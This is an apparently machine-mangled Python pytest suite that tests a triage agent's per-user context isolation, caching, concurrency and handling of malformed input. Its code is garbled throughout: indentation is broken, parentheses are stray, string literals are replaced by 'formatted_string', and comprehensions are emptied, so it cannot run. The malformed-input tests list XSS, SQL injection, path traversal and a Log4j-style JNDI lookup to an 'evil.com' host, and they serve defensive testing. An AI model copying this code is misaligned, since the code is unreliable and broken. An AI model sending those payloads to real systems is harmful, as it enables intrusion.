import asyncio
import pytest
from typing import List, Set, Dict, Any
from unittest.mock import MagicMock, AsyncMock
from test_framework.ssot.base_test_case import SSotBaseTestCase

class TestWebSocketConnection:
    """Real WebSocket connection for testing instead of mocks."""

    def __init__(self):
        pass
        self.messages_sent = []
        self.is_connected = True
        self._closed = False

    async def send_json(self, message: dict):
        """Send JSON message."""
        if self._closed:
        raise RuntimeError("WebSocket is closed")
        self.messages_sent.append(message)

    async def close(self, code: int = 1000, reason: str = "Normal closure"):
        """Close WebSocket connection."""
        pass
        self._closed = True
        self.is_connected = False

    def get_messages(self) -> list:
        """Get all sent messages."""
        await asyncio.sleep(0)
        return self.messages_sent.copy()

        '''
        COMPREHENSIVE FAILING TEST SUITE: TriageSubAgent UserExecutionContext Migration

        This test suite is designed to be EXTREMELY comprehensive and difficult, targeting every
        possible failure mode in the TriageSubAgent migration to UserExecutionContext pattern.

        The TriageSubAgent is CRITICAL as it"s the first contact for ALL users - any failure
        here affects ALL segments and has massive revenue impact.

        Tests are designed to INTENTIONALLY FAIL to catch ANY regression or incomplete migration.
        Each test pushes the boundaries of the system to ensure robust implementation.

        Coverage Areas:
        - Context validation for triage requests
        - Triage result isolation between concurrent users
        - Child context creation for nested operations
        - Legacy method removal verification
        - Request ID tracking through triage pipeline
        - Database session management for triage data
        - Error scenarios (malformed requests, validation failures)
        - Concurrent user triage isolation
        - Memory leaks in triage processing
        - Edge cases (empty requests, massive requests)
        - Performance tests under high triage load
        - Security tests for triage data leakage
        - Race conditions in triage categorization
        - Resource exhaustion scenarios
        - Timeout handling for slow triage
        - Cache poisoning attacks
        - Triage result tampering prevention
        '''

        import asyncio
        import gc
        import json
        import logging
        import pytest
        import threading
        import time
        import uuid
        import weakref
        from concurrent.futures import ThreadPoolExecutor
        from contextlib import asynccontextmanager
        from dataclasses import dataclass, field
        from datetime import datetime, timezone, timedelta
        from typing import Any, Dict, List, Optional, Set, Tuple
        from sqlalchemy.ext.asyncio import AsyncSession
        from netra_backend.app.websocket_core.websocket_manager import WebSocketManager
        from test_framework.database.test_database_manager import DatabaseTestManager
        from netra_backend.app.redis_manager import redis_manager
        from auth_service.core.auth_manager import AuthManager
        from netra_backend.app.agents.supervisor.agent_registry import AgentRegistry
        from netra_backend.app.agents.supervisor.user_execution_engine import UserExecutionEngine
        from shared.isolated_environment import IsolatedEnvironment

        # Import the classes under test
        from netra_backend.app.agents.triage.unified_triage_agent import TriageSubAgent
        from netra_backend.app.agents.supervisor.user_execution_context import ( )
        UserExecutionContext,
        InvalidContextError,
        validate_user_context,
        clear_shared_objects,
        register_shared_object
        
        from netra_backend.app.agents.base.interface import ExecutionContext
        from netra_backend.app.schemas.agent_models import DeepAgentState
        from netra_backend.app.agents.triage.unified_triage_agent import TriageResult
        from netra_backend.app.llm.llm_manager import LLMManager
        from netra_backend.app.agents.tool_dispatcher import ToolDispatcher
        from netra_backend.app.core.unified_error_handler import UnifiedErrorHandler
        from netra_backend.app.db.database_manager import DatabaseManager
        from netra_backend.app.clients.auth_client_core import AuthServiceClient
        from shared.isolated_environment import get_env


        # Test Configuration
        TEST_TIMEOUT = 30  # seconds
        MAX_CONCURRENT_TRIAGE_REQUESTS = 100
        STRESS_TEST_ITERATIONS = 200
        MEMORY_LEAK_THRESHOLD = 2 * 1024 * 1024  # 2MB
        RACE_CONDITION_ITERATIONS = 1000
        TRIAGE_CATEGORIES = [ )
        "data_analysis", "reporting", "optimization", "synthetic_data",
        "corpus_management", "admin", "validation", "error_handling"
        


class TriageDataLeakageMonitor:
        """Specialized monitor for triage data leakage between users."""

    def __init__(self):
        pass
        self.triage_results: Dict[str, Dict] = {}
        self.user_requests: Dict[str, str] = {}
        self.sensitive_entities: Dict[str, List] = {}

    def record_triage_result(self, user_id: str, triage_result: Dict):
        """Record triage result for leak detection."""
        self.triage_results[user_id] = triage_result.copy()

    def record_user_request(self, user_id: str, request: str):
        """Record user request for cross-contamination detection."""
        pass
        self.user_requests[user_id] = request

    def record_extracted_entities(self, user_id: str, entities: List):
        """Record extracted entities for privacy validation."""
        self.sensitive_entities[user_id] = entities.copy()

    def check_cross_user_contamination(self, user_id: str, result: Dict) -> bool:
        """Check if triage result contains data from other users."""
        pass
        for other_user, other_result in self.triage_results.items():
        if other_user != user_id:
            # Check if this result contains other user's data
        if self._contains_cross_user_data(result, other_result):
        return True

                # Check if user's request leaked into another user's entities
        if user_id in self.user_requests:
        user_request = self.user_requests[user_id]
        if other_user in self.sensitive_entities:
        other_entities = self.sensitive_entities[other_user]
        for entity in other_entities:
        if isinstance(entity, dict) and "text" in entity:
        if user_request in entity["text"]:
        return True
        return False

    def _contains_cross_user_data(self, result1: Dict, result2: Dict) -> bool:
        """Check if two triage results contain overlapping sensitive data."""
    # Convert to strings for comparison
        result1_str = json.dumps(result1, sort_keys=True)
        result2_str = json.dumps(result2, sort_keys=True)

    # Check for exact matches (indicates shared data)
        if result1_str == result2_str:
        return True

        # Check for shared entity references
        if "entities" in result1 and "entities" in result2:
        entities1 = set(str(e) for e in result1["entities"])
        entities2 = set(str(e) for e in result2["entities"])
        if entities1.intersection(entities2):
        return True

        return False

    def clear(self):
        """Clear monitoring data."""
        self.triage_results.clear()
        self.user_requests.clear()
        self.sensitive_entities.clear()


        @dataclass
class TriageStressMetrics:
        """Metrics collector for triage stress testing."""
        pass
        total_triage_requests: int = 0
        successful_triage: int = 0
        failed_triage: int = 0
        validation_failures: int = 0
        categorization_failures: int = 0
        average_triage_time: float = 0.0
        memory_usage_start: int = 0
        memory_usage_peak: int = 0
        concurrent_requests_peak: int = 0
        cache_hit_rate: float = 0.0
        entity_extraction_failures: int = 0
        errors: List[Exception] = field(default_factory=list)

    def calculate_success_rate(self) -> float:
        """Calculate overall triage success rate."""
        if self.total_triage_requests == 0:
        return 0.0
        return (self.successful_triage / self.total_triage_requests) * 100


class TriageContextMigrationTestSuite:
        """Comprehensive test suite for TriageSubAgent UserExecutionContext migration."""

    def __init__(self):
        pass
        self.leak_monitor = TriageDataLeakageMonitor()
        self.stress_metrics = TriageStressMetrics()
        self.active_triage_agents: List[weakref.ref] = []

        @pytest.fixture
    async def setup_and_cleanup(self):
        """Setup and cleanup for each test."""
    Clear any shared objects from previous tests
        clear_shared_objects()
        self.leak_monitor.clear()
        gc.collect()  # Force garbage collection

        yield

    # Cleanup after test
        self.leak_monitor.clear()
        clear_shared_objects()
        gc.collect()

        @pytest.fixture
    async def mock_triage_dependencies(self):
        """Create mock dependencies for TriageSubAgent."""
        pass
        llm_manager = Mock(spec=LLMManager)
        tool_dispatcher = Mock(spec=ToolDispatcher)

    # Mock LLM responses for triage
        mock_llm_response = { )
        "category": "data_analysis",
        "confidence_score": 0.95,
        "entities": [{"type": "dataset", "value": "sales_data"}],
        "recommended_tools": ["data_processor", "analyzer"],
        "intent": "analyze_data"
    

        llm_manager.generate_completion = AsyncMock(return_value=json.dumps(mock_llm_response))

        await asyncio.sleep(0)
        return { )
        'llm_manager': llm_manager,
        'tool_dispatcher': tool_dispatcher
    

        @pytest.fixture
    async def valid_user_context(self):
        """Create a valid UserExecutionContext for triage testing."""
        await asyncio.sleep(0)
        return UserExecutionContext.from_request( )
        user_id="formatted_string",
        thread_id="formatted_string",
        run_id="formatted_string"
    

    async def create_triage_agent_with_context(self, deps, user_context):
        """Helper to create TriageSubAgent with UserExecutionContext."""
        pass
        agent = TriageSubAgent()

    # Inject dependencies (normally done by dependency injection)
        agent.llm_manager = deps['llm_manager']
        agent.tool_dispatcher = deps['tool_dispatcher']

    # Inject user context (this is what we're testing)
        agent.user_context = user_context

        await asyncio.sleep(0)
        return agent


class TestTriageUserExecutionContextValidation(TriageContextMigrationTestSuite):
        """Test UserExecutionContext validation specific to triage operations."""

@pytest.mark.asyncio
    async def test_triage_context_with_triage_specific_metadata(self):
"""Test context creation with triage-specific metadata."""
triage_metadata = { )
"request_category": "data_analysis",
"priority": "high",
"user_segment": "enterprise",
"request_complexity": "complex",
"expected_tools": ["data_processor", "analyzer"],
"user_preferences": {"language": "en", "detailed_output": True}
        

context = UserExecutionContext.from_request( )
user_id="triage_metadata_user",
thread_id="triage_metadata_thread",
run_id="triage_metadata_run",
metadata=triage_metadata
        

        # Verify metadata preservation
assert context.metadata["request_category"] == "data_analysis"
assert context.metadata["priority"] == "high"
assert context.metadata["user_segment"] == "enterprise"
assert len(context.metadata["expected_tools"]) == 2

@pytest.mark.asyncio
    async def test_triage_context_prevents_category_injection(self):
"""Test that context prevents triage category injection attacks."""
pass
malicious_categories = [ )
"admin_override", "bypass_validation", "elevated_access",
"<script>alert("xss")</script>", ""; DROP TABLE triage_results; --",
"../../../etc/passwd", "__proto__", "constructor"
            

for malicious_category in malicious_categories:
context = UserExecutionContext.from_request( )
user_id="security_test_user",
thread_id="security_test_thread",
run_id="security_test_run",
metadata={"category_override": malicious_category}
                

                # Category should be stored as-is but not executed
assert context.metadata["category_override"] == malicious_category

                # Verify no code execution or privilege escalation
serialized = context.to_dict()
assert serialized["metadata"]["category_override"] == malicious_category

@pytest.mark.asyncio
    async def test_triage_child_context_for_entity_extraction(self, valid_user_context):
"""Test child context creation for entity extraction sub-operations."""
entity_context = valid_user_context.create_child_context( )
operation_name="entity_extraction",
additional_metadata={ )
"extraction_method": "llm_based",
"entity_types": ["person", "organization", "location"],
"confidence_threshold": 0.8
                    
                    

                    # Verify inheritance
assert entity_context.user_id == valid_user_context.user_id
assert entity_context.thread_id == valid_user_context.thread_id
assert entity_context.run_id == valid_user_context.run_id

                    # Verify operation-specific data
assert entity_context.metadata["operation_name"] == "entity_extraction"
assert entity_context.metadata["parent_request_id"] == valid_user_context.request_id
assert entity_context.metadata["extraction_method"] == "llm_based"
assert len(entity_context.metadata["entity_types"]) == 3

                    # Test nested operations (intent detection after entity extraction)
intent_context = entity_context.create_child_context( )
operation_name="intent_detection",
additional_metadata={"detected_entities": ["company_data"]}
                    

assert intent_context.metadata["operation_depth"] == 2
assert intent_context.metadata["parent_request_id"] == entity_context.request_id
assert "detected_entities" in intent_context.metadata


class TestTriageAgentContextIntegration(TriageContextMigrationTestSuite):
    """Test TriageSubAgent integration with UserExecutionContext."""

@pytest.mark.asyncio
    async def test_triage_agent_creation_with_context(self, mock_triage_dependencies, valid_user_context):
"""Test successful triage agent creation with UserExecutionContext."""
triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, valid_user_context
        

        # Verify agent has context
assert triage_agent.user_context is not None
assert triage_agent.user_context.user_id == valid_user_context.user_id
assert triage_agent.user_context.thread_id == valid_user_context.thread_id
assert triage_agent.user_context.run_id == valid_user_context.run_id

@pytest.mark.asyncio
    async def test_triage_execution_with_context_validation(self, mock_triage_dependencies, valid_user_context):
"""Test triage execution with proper context validation."""
pass
triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, valid_user_context
            

state = DeepAgentState()
state.user_request = "Analyze the sales data for Q4 performance trends"
state.user_id = valid_user_context.user_id

context = ExecutionContext( )
run_id=valid_user_context.run_id,
agent_name="TriageSubAgent",
state=state,
thread_id=valid_user_context.thread_id,
user_id=valid_user_context.user_id
            

            # Verify preconditions pass with valid context
preconditions_valid = await triage_agent.validate_preconditions(context)
assert preconditions_valid is True

            # Execute core logic
result = await triage_agent.execute_core_logic(context)

            # Verify result structure
assert isinstance(result, dict)
assert "category" in str(result) or state.triage_result is not None

@pytest.mark.asyncio
    async def test_triage_context_propagation_through_pipeline(self, mock_triage_dependencies, valid_user_context):
"""Test that user context is properly propagated through triage pipeline."""
triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, valid_user_context
                

                # Track context propagation
context_tracking = []

def track_context_usage(*args, **kwargs):
"""Use real service instance."""
    # TODO: Initialize real service
pass
    Extract context information from calls
for arg in args:
if hasattr(arg, 'user_id'):
context_tracking.append({ ))
'operation': 'context_used',
'user_id': arg.user_id,
'timestamp': time.time()
            
await asyncio.sleep(0)
return {"category": "tracked", "confidence_score": 0.9}

            # Mock the triage core components to track context usage
with patch.object(triage_agent, 'triage_core') as mock_core:
mock_core.validator.validate_request = Mock(return_value=Mock(is_valid=True))
mock_core.generate_request_hash = Mock(return_value="test_hash")
mock_core.get_cached_result = AsyncMock(return_value=None)
mock_core.websocket = TestWebSocketConnection()

with patch.object(triage_agent, 'processor') as mock_processor:
mock_processor.process_with_llm = AsyncMock(side_effect=track_context_usage)
mock_processor.enrich_triage_result = Mock(side_effect=track_context_usage)
mock_processor.websocket = TestWebSocketConnection()  # Real WebSocket implementation

state = DeepAgentState()
state.user_request = "Process with context tracking"

context = ExecutionContext( )
run_id=valid_user_context.run_id,
agent_name="TriageSubAgent",
state=state,
thread_id=valid_user_context.thread_id,
user_id=valid_user_context.user_id
                    

await triage_agent.execute_core_logic(context)

                    # Verify context was used in pipeline
assert len(context_tracking) > 0, "Context not propagated through triage pipeline"

@pytest.mark.asyncio
    async def test_triage_legacy_method_security_check(self, mock_triage_dependencies, valid_user_context):
"""Test that legacy methods that bypass context validation are secured or removed."""
triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, valid_user_context
                        

                        # Check for dangerous legacy patterns that might bypass context validation
dangerous_legacy_methods = [ )
'direct_execute',  # Direct execution bypassing context
'execute_without_context',  # Execution without user context
'global_triage_execute',  # Global state usage
'shared_triage_session',  # Shared session across users
'bypass_validation',  # Validation bypass
'admin_override_triage',  # Admin overrides
'execute_with_elevated_privileges'  # Privilege escalation
                        

for dangerous_method in dangerous_legacy_methods:
assert not hasattr(triage_agent, dangerous_method), \
"formatted_string"

                            # Verify that the current execute method requires proper context
state = DeepAgentState()
state.user_request = "test request"

                            # Execute should work with proper setup
try:
await triage_agent.execute(state, valid_user_context.run_id, stream_updates=False)
                                # If it succeeds, that's fine - just verify no data leakage
except Exception as e:
                                    # If it fails, ensure it's not due to missing security checks
assert "context" not in str(e).lower() or "validation" in str(e).lower(), \
"formatted_string"


class TestTriageConcurrentUserIsolation(TriageContextMigrationTestSuite):
    """Test isolation between concurrent triage requests."""

@pytest.mark.asyncio
    async def test_concurrent_triage_request_isolation(self, mock_triage_dependencies):
"""Test that concurrent triage requests are completely isolated."""
num_concurrent_users = 20
triage_requests = []

        # Create different triage scenarios for each user
request_templates = [ )
"Analyze sales data for {user_id} company revenue",
"Generate report on {user_id} customer satisfaction metrics",
"Optimize {user_id} supply chain operations",
"Create synthetic data for {user_id} product testing",
"Validate {user_id} data quality and completeness"
        

        # Create users with unique, identifiable requests
for i in range(num_concurrent_users):
user_id = "formatted_string"
request = request_templates[i % len(request_templates)].format(user_id=user_id)

context = UserExecutionContext.from_request( )
user_id=user_id,
thread_id="formatted_string",
run_id="formatted_string",
metadata={ )
"user_specific_data": "formatted_string",
"request_signature": "formatted_string",
"user_segment": "formatted_string"
            
            

triage_requests.append((context, request))

            # Execute all triage requests concurrently
async def execute_triage_with_isolation_check(context, request):
triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, context
    

state = DeepAgentState()
state.user_request = request
state.user_id = context.user_id

exec_context = ExecutionContext( )
run_id=context.run_id,
agent_name="TriageSubAgent",
state=state,
thread_id=context.thread_id,
user_id=context.user_id
    

    # Execute triage
result = await triage_agent.execute_core_logic(exec_context)

    # Record for leak detection
triage_result = state.triage_result if hasattr(state, 'triage_result') else result
self.leak_monitor.record_triage_result(context.user_id, triage_result)
self.leak_monitor.record_user_request(context.user_id, request)

await asyncio.sleep(0)
return { )
'user_id': context.user_id,
'result': result,
'state': state,
'context': context,
'request': request
    

    # Execute all concurrently
tasks = [ )
execute_triage_with_isolation_check(context, request)
for context, request in triage_requests
    

results = await asyncio.gather(*tasks, return_exceptions=True)

    # Verify no exceptions occurred
exceptions = [item for item in []]
assert len(exceptions) == 0, "formatted_string"

successful_results = [item for item in []]
assert len(successful_results) == num_concurrent_users

    # Verify no cross-user data contamination
for result_data in successful_results:
user_id = result_data['user_id']
result = result_data.get('result', {})

        # Check for data leakage
assert not self.leak_monitor.check_cross_user_contamination(user_id, result), \
"formatted_string"

        # Verify user-specific data didn't leak to other users
for other_result_data in successful_results:
if other_result_data['user_id'] != user_id:
other_request = other_result_data['request']
                # User's specific data should not appear in other user's processing
assert user_id not in other_request, \
"formatted_string"s request"

@pytest.mark.asyncio
    async def test_triage_cache_isolation_between_users(self, mock_triage_dependencies):
"""Test that triage caching doesn't leak data between users."""
pass
                    Create similar requests from different users that might hit the same cache
similar_requests = [ )
"Analyze sales data",
"analyze sales data",  # Case variation
"Analyze sales data.",  # Punctuation variation
"Analyze sales data for insights"  # Length variation
                    

user_results = {}

                    Execute requests from different users
for i, request in enumerate(similar_requests):
user_id = "formatted_string"

context = UserExecutionContext.from_request( )
user_id=user_id,
thread_id="formatted_string",
run_id="formatted_string",
metadata={"secret_key": "formatted_string"}
                        

triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, context
                        

                        # Mock cache to await asyncio.sleep(0)
return different results based on user context
cache_results = {}

async def user_aware_cache_get(key):
pass
full_key = "formatted_string"
await asyncio.sleep(0)
return cache_results.get(full_key)

async def user_aware_cache_set(key, value):
pass
full_key = "formatted_string"
cache_results[full_key] = value

with patch.object(triage_agent.triage_core, 'get_cached_result', side_effect=user_aware_cache_get):
with patch.object(triage_agent.triage_core, 'cache_result', side_effect=user_aware_cache_set):

state = DeepAgentState()
state.user_request = request
state.user_id = context.user_id

exec_context = ExecutionContext( )
run_id=context.run_id,
agent_name="TriageSubAgent",
state=state,
thread_id=context.thread_id,
user_id=context.user_id
            

result = await triage_agent.execute_core_logic(exec_context)
user_results[user_id] = { )
'result': result,
'state': state,
'request': request,
'context': context
            

            # Verify each user got isolated results
user_ids = list(user_results.keys())
for i, user_id in enumerate(user_ids):
for j, other_user_id in enumerate(user_ids):
if i != j:
                        # Results should be different even for similar requests
result1 = user_results[user_id]['result']
result2 = user_results[other_user_id]['result']

                        # Convert to comparable format
result1_str = str(result1)
result2_str = str(result2)

                        # Should contain user-specific information
assert user_id in result1_str or user_results[user_id]['state'].user_id in result1_str, \
"formatted_string"t contain user-specific data"

                        # Should not contain other user's data
assert other_user_id not in result1_str, \
"formatted_string"

@pytest.mark.asyncio
    async def test_triage_race_conditions_in_categorization(self, mock_triage_dependencies):
"""Test for race conditions during concurrent triage categorization."""
race_results = []
shared_state = {"counter": 0, "last_category": None}

async def racy_triage_execution():
user_id = "formatted_string"
context = UserExecutionContext.from_request( )
user_id=user_id,
thread_id="formatted_string",
run_id="formatted_string"
    

triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, context
    

    # Create a potential race condition by modifying shared state
original_counter = shared_state["counter"]
shared_state["counter"] += 1

    # Simulate processing delay that might expose race conditions
await asyncio.sleep(0.001)  # 1ms delay

state = DeepAgentState()
state.user_request = "formatted_string"
state.user_id = context.user_id

exec_context = ExecutionContext( )
run_id=context.run_id,
agent_name="TriageSubAgent",
state=state,
thread_id=context.thread_id,
user_id=context.user_id
    

    # Execute triage
result = await triage_agent.execute_core_logic(exec_context)

    # Check for race condition indicators
final_counter = shared_state["counter"]

await asyncio.sleep(0)
return { )
'user_id': user_id,
'context_id': context.request_id,
'original_counter': original_counter,
'final_counter': final_counter,
'result': result,
'timestamp': time.time()
    

    # Execute many operations concurrently to trigger race conditions
tasks = [racy_triage_execution() for _ in range(RACE_CONDITION_ITERATIONS)]
results = await asyncio.gather(*tasks, return_exceptions=True)

    # Check for exceptions indicating race conditions
exceptions = [item for item in []]
assert len(exceptions) == 0, "formatted_string"

successful_results = [item for item in []]

    # Verify all operations completed successfully
assert len(successful_results) == RACE_CONDITION_ITERATIONS

    # Verify all contexts are unique (no race in context creation)
context_ids = [r['context_id'] for r in successful_results]
assert len(set(context_ids)) == len(context_ids), "Duplicate context IDs - race condition detected!"

    # Verify user IDs are unique
user_ids = [r['user_id'] for r in successful_results]
assert len(set(user_ids)) == len(user_ids), "Duplicate user IDs - race condition detected!"


class TestTriageErrorScenariosAndEdgeCases(TriageContextMigrationTestSuite):
        """Test error scenarios and edge cases in triage processing."""

@pytest.mark.asyncio
    async def test_triage_with_malformed_requests(self, mock_triage_dependencies, valid_user_context):
"""Test triage handling of malformed, empty, or malicious requests."""
malformed_requests = [ )
"",  # Empty request
"   ",  # Whitespace only
"
\t\r",  # Special characters only
None,  # None value (should be caught earlier)
"A" * 100000,  # Extremely long request (100KB)
"<script>alert('xss')</script>",  # XSS attempt
""; DROP TABLE triage_results; --",  # SQL injection attempt
"{'malicious': 'json', '__proto__': {'isAdmin': True}}",  # JSON injection
"\x00\x01\x02\x03",  # Binary data
"[U+1F680]" * 1000,  # Unicode stress test
"SELECT * FROM sensitive_data WHERE user_id = 'admin'",  # SQL-like query
"../../../etc/passwd",  # Path traversal attempt
"${jndi:ldap://evil.com/a}",  # Log4j style injection
        

triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, valid_user_context
        

for malformed_request in malformed_requests:
state = DeepAgentState()
state.user_request = malformed_request
state.user_id = valid_user_context.user_id

context = ExecutionContext( )
run_id="formatted_string",
agent_name="TriageSubAgent",
state=state,
thread_id=valid_user_context.thread_id,
user_id=valid_user_context.user_id
            

try:
                # Attempt triage - should handle malformed input gracefully
if malformed_request is None:
                    # None should be caught by precondition validation
preconditions_valid = await triage_agent.validate_preconditions(context)
assert preconditions_valid is False, "None request should fail preconditions"
else:
result = await triage_agent.execute_core_logic(context)

                        # Verify result is safe and doesn't contain malicious content
result_str = str(result)

                        # Should not execute any injected code
assert "alert(" not in result_str, "XSS not properly sanitized" )
assert "DROP TABLE" not in result_str, "SQL injection not properly handled"

                        # Should have some form of valid triage result
assert isinstance(result, dict) or state.triage_result is not None

except Exception as e:
                            # Exceptions are OK for truly malformed input, but should be handled gracefully
assert not isinstance(e, (SyntaxError, eval)), \
"formatted_string"

@pytest.mark.asyncio
    async def test_triage_memory_limits_and_resource_exhaustion(self, mock_triage_dependencies, valid_user_context):
"""Test triage behavior under memory pressure and resource exhaustion."""
pass
triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, valid_user_context
                                

                                # Test with increasingly large requests to find memory limits
memory_usage_start = self._get_memory_usage()
large_requests = []

for size_mb in [1, 5, 10, 20]:  # MB
large_request = "Analyze " + "data " * (size_mb * 1024 * 256 // 5)  # Approximately size_mb MB
large_requests.append((size_mb, large_request))

for size_mb, large_request in large_requests:
state = DeepAgentState()
state.user_request = large_request
state.user_id = valid_user_context.user_id

context = ExecutionContext( )
run_id="formatted_string",
agent_name="TriageSubAgent",
state=state,
thread_id=valid_user_context.thread_id,
user_id=valid_user_context.user_id
                                    

try:
                                        # Monitor memory usage during triage
memory_before = self._get_memory_usage()

result = await triage_agent.execute_core_logic(context)

memory_after = self._get_memory_usage()
memory_delta = memory_after - memory_before

                                        # Verify memory usage is reasonable relative to input size
expected_max_memory = size_mb * 1024 * 1024 * 3  # Allow 3x input size
assert memory_delta < expected_max_memory, \
"formatted_string"

                                        # Verify result is still valid
assert isinstance(result, dict) or state.triage_result is not None

except MemoryError:
                                            # MemoryError is acceptable for very large inputs
logging.warning("formatted_string")
break

except Exception as e:
                                                # Other exceptions should be handled gracefully
assert "memory" in str(e).lower() or "size" in str(e).lower(), \
"formatted_string"

                                                # Verify memory was released after processing
gc.collect()
memory_usage_final = self._get_memory_usage()
memory_growth = memory_usage_final - memory_usage_start

assert memory_growth < MEMORY_LEAK_THRESHOLD, \
"formatted_string"

@pytest.mark.asyncio
    async def test_triage_timeout_scenarios(self, mock_triage_dependencies, valid_user_context):
"""Test triage behavior under various timeout scenarios."""
triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, valid_user_context
                                                    

                                                    # Mock slow LLM responses
async def slow_llm_response(*args, **kwargs):
await asyncio.sleep(10)  # Very slow
await asyncio.sleep(0)
return '{"category": "timeout_test", "confidence_score": 0.5}'

with patch.object(mock_triage_dependencies['llm_manager'], 'generate_completion', side_effect=slow_llm_response):

state = DeepAgentState()
state.user_request = "This request will timeout during processing"
state.user_id = valid_user_context.user_id

context = ExecutionContext( )
run_id="formatted_string",
agent_name="TriageSubAgent",
state=state,
thread_id=valid_user_context.thread_id,
user_id=valid_user_context.user_id
        

        # Execute with timeout - should handle gracefully
with pytest.raises(asyncio.TimeoutError):
await asyncio.wait_for( )
triage_agent.execute_core_logic(context),
timeout=2.0  # 2 second timeout
            

            # Verify the context is still valid after timeout
assert context.user_id == valid_user_context.user_id
assert context.state.user_request is not None

def _get_memory_usage(self) -> int:
"""Get current memory usage."""
pass
try:
import psutil
import os
process = psutil.Process(os.getpid())
return process.memory_info().rss
except ImportError:
            # Fallback if psutil not available
import sys
return sys.getsizeof(gc.get_objects())


class TestTriagePerformanceAndStress(TriageContextMigrationTestSuite):
        """Performance and stress testing for triage operations."""

@pytest.mark.asyncio
    async def test_high_volume_concurrent_triage_requests(self, mock_triage_dependencies):
"""Test triage performance under high concurrent load."""
num_concurrent_requests = MAX_CONCURRENT_TRIAGE_REQUESTS
start_time = time.time()

        # Create diverse triage requests
request_patterns = [ )
"Analyze {data_type} data for {user_id}",
"Generate report on {metric} for {user_id}",
"Optimize {process} operations for {user_id}",
"Create synthetic {data_type} for {user_id}",
"Validate {data_type} quality for {user_id}"
        

data_types = ["sales", "customer", "inventory", "financial", "operational"]
metrics = ["performance", "efficiency", "quality", "satisfaction", "growth"]
processes = ["supply_chain", "manufacturing", "logistics", "marketing", "support"]

async def execute_concurrent_triage(request_id):
user_id = "formatted_string"
pattern = request_patterns[request_id % len(request_patterns)]

request_text = pattern.format( )
data_type=data_types[request_id % len(data_types)],
metric=metrics[request_id % len(metrics)],
process=processes[request_id % len(processes)],
user_id=user_id
    

context = UserExecutionContext.from_request( )
user_id=user_id,
thread_id="formatted_string",
run_id="formatted_string"
    

triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, context
    

execution_start = time.time()

try:
state = DeepAgentState()
state.user_request = request_text
state.user_id = context.user_id

exec_context = ExecutionContext( )
run_id=context.run_id,
agent_name="TriageSubAgent",
state=state,
thread_id=context.thread_id,
user_id=context.user_id
        

result = await triage_agent.execute_core_logic(exec_context)

execution_time = time.time() - execution_start

self.stress_metrics.total_triage_requests += 1
self.stress_metrics.successful_triage += 1

await asyncio.sleep(0)
return { )
'request_id': request_id,
'user_id': user_id,
'execution_time': execution_time,
'result': result,
'success': True
        

except Exception as e:
execution_time = time.time() - execution_start

self.stress_metrics.total_triage_requests += 1
self.stress_metrics.failed_triage += 1
self.stress_metrics.add_error(e)

return { )
'request_id': request_id,
'user_id': user_id,
'execution_time': execution_time,
'error': str(e),
'success': False
            

            # Execute all requests concurrently
tasks = [execute_concurrent_triage(i) for i in range(num_concurrent_requests)]
results = await asyncio.gather(*tasks, return_exceptions=True)

total_time = time.time() - start_time

            # Process results
successful_results = [item for item in []]
failed_results = [item for item in []]
exception_results = [item for item in []]

            # Calculate performance metrics
if successful_results:
avg_execution_time = sum(r['execution_time'] for r in successful_results) / len(successful_results)
self.stress_metrics.average_triage_time = avg_execution_time

                # Performance assertions
success_rate = len(successful_results) / num_concurrent_requests * 100

print(f"Concurrent Triage Stress Test Results:")
print("formatted_string")
print("formatted_string")
print("formatted_string")
print("formatted_string")
print("formatted_string")
print("formatted_string")
print("formatted_string")

                # Assert performance requirements
assert success_rate >= 95.0, "formatted_string"
assert total_time < 60.0, "formatted_string"
assert self.stress_metrics.average_triage_time < 5.0, \
"formatted_string"

                # Check for user isolation in high-load scenario
user_ids = [r['user_id'] for r in successful_results]
assert len(set(user_ids)) == len(user_ids), "User ID collision under high load!"

@pytest.mark.asyncio
    async def test_triage_cache_performance_under_load(self, mock_triage_dependencies):
"""Test triage caching performance under high load."""
pass
                    Create requests that should benefit from caching
cacheable_requests = [ )
"Analyze sales data",
"Generate performance report",
"Optimize operations",
"Create synthetic data",
"Validate data quality"
                    

cache_performance = { )
'cache_hits': 0,
'cache_misses': 0,
'total_requests': 0
                    

                    # Mock cache to track hit/miss ratio
cache_storage = {}

async def mock_cache_get(key):
pass
if key in cache_storage:
cache_performance['cache_hits'] += 1
await asyncio.sleep(0)
return cache_storage[key]
else:
cache_performance['cache_misses'] += 1
return None

async def mock_cache_set(key, value):
pass
cache_storage[key] = value

    # Execute many requests that should hit the cache
num_requests = 100

async def execute_cacheable_triage(request_id):
pass
request_text = cacheable_requests[request_id % len(cacheable_requests)]
user_id = "formatted_string"

context = UserExecutionContext.from_request( )
user_id=user_id,
thread_id="formatted_string",
run_id="formatted_string"
    

triage_agent = await self.create_triage_agent_with_context( )
mock_triage_dependencies, context
    

    # Mock the cache methods
with patch.object(triage_agent.triage_core, 'get_cached_result', side_effect=mock_cache_get):
with patch.object(triage_agent.triage_core, 'cache_result', side_effect=mock_cache_set):

execution_start = time.time()

state = DeepAgentState()
state.user_request = request_text
state.user_id = context.user_id

exec_context = ExecutionContext( )
run_id=context.run_id,
agent_name="TriageSubAgent",
state=state,
thread_id=context.thread_id,
user_id=context.user_id
            

result = await triage_agent.execute_core_logic(exec_context)

execution_time = time.time() - execution_start
cache_performance['total_requests'] += 1

await asyncio.sleep(0)
return { )
'execution_time': execution_time,
'cache_hit': request_text in [cacheable_requests[i] for i in range(len(cacheable_requests))]
            

            # Execute requests
tasks = [execute_cacheable_triage(i) for i in range(num_requests)]
results = await asyncio.gather(*tasks, return_exceptions=True)

successful_results = [item for item in []]

            # Calculate cache performance
if cache_performance['total_requests'] > 0:
cache_hit_rate = (cache_performance['cache_hits'] / cache_performance['total_requests']) * 100
self.stress_metrics.cache_hit_rate = cache_hit_rate

                # Performance assertions for caching
print(f"Cache Performance Results:")
print("formatted_string")
print("formatted_string")
print("formatted_string")
print("formatted_string")

                # With repeated requests, we should see some cache hits
